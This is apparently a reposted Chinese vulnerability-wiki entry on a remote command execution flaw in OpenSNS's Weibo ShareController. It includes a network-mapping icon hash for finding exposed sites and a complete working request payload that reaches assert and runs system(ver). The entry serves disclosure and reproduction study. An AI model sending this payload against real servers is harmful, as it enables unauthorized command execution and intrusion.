---
title: "OpenSNS Application ShareController.class.php 远程命令执行漏洞"
date: 2026-10-12 09:00:47
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "OpenSNS"
tags:
  - "OpenSNS"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

OpenSNS 存在远程命令执行漏洞，攻击者通过漏洞发送特定的请求包可以执行任意命令

## 漏洞影响

```
OpenSNS
```

## 网络测绘

```
icon_hash="1167011145"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170923817.png)

存在漏洞的文件 `Application/Weibo/Controller/ShareController.class.php`

![image-20220518154015894](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181540972.png)

发送Payload

```plain
/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170923310.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/OpenSNS-Application-ShareController.class.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
